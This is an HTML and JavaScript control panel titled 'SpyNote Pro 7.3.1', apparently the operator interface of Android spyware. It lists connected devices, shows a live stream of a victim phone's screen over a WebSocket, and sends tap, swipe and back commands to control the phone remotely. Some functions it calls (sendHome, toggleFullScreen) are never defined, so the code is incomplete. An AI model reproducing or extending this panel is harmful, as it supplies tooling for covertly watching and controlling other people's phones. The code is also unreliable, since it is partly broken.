<!DOCTYPE html>
<html>
<head>
    <title>SpyNote Pro 7.3.1 - Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { margin: 0; font-family: Arial; background: #1a1a1a; color: white; }
        #devices { position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 10px; max-height: 400px; overflow-y: auto; }
        .device { padding: 8px; margin: 4px; background: #333; cursor: pointer; border-radius: 4px; }
        .device:hover { background: #555; }
        .active { background: #00ff00 !important; }
        #phone-frame { 
            width: 400px; height: 800px; 
            margin: 20px auto; 
            background: #000; 
            border: 20px solid #333; 
            border-radius: 40px; 
            position: relative;
            cursor: pointer;
            touch-action: none;
        }
        #screen { width: 100%; height: 100%; background: #111; }
        #controls { text-align: center; margin: 20px; }
        button { padding: 12px 24px; margin: 5px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div id="devices">
        <h3>Connected Devices</h3>
        <div id="device-list"></div>
    </div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">Back</button>
        <button onclick="sendHome()">Home</button>
        <button onclick="toggleFullScreen()">Fullscreen</button>
    </div>

   <script>
const ws = new WebSocket(`ws://${location.host}?role=panel`);
let currentDevice = null;

const canvas = document.getElementById('screen');
const ctx = canvas.getContext('2d');

ws.onmessage = e => {
  const d = JSON.parse(e.data);
  if (d.type === 'screen' && d.deviceId === currentDevice) {
    const img = new Image();
    img.onload = () => {
      canvas.width = img.width;
      canvas.height = img.height;
      ctx.drawImage(img, 0, 0);
    };
    img.src = 'data:image/jpeg;base64,' + d.data;
  }
};

function sendTap(x,y){
  ws.send(JSON.stringify({ action:'tap', deviceId:currentDevice, x,y }));
}
function sendSwipe(sx,sy,ex,ey){
  ws.send(JSON.stringify({ action:'swipe', deviceId:currentDevice,
    startX:sx,startY:sy,endX:ex,endY:ey }));
}
function sendBack(){
  ws.send(JSON.stringify({ action:'back', deviceId:currentDevice }));
}
</script>

</body>
</html>
